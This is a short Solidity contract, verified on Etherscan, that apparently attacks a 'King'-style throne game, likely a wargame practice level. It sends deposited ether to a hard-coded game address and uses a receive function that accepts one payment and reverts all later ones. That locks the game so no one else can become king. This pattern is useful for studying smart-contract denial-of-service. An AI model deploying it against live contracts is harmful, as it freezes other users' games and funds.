/**
 *Submitted for verification at Etherscan.io on 2022-09-09
*/

pragma solidity >= 0.8.0 < 0.9.0;

contract KingFun{
    bool alreadyKing = false;
    address payable kingGameAddress = payable(0xc44594f48BA69aEAD04C12BF86A315320968E994);
    uint256 amount = 0;

    function becomeKing() public {
        kingGameAddress.transfer(amount);
    }
    function deposit() payable public{
        amount += msg.value;
    }

    receive() external payable{
        require(!alreadyKing, "King!");
        alreadyKing = true;
    }
}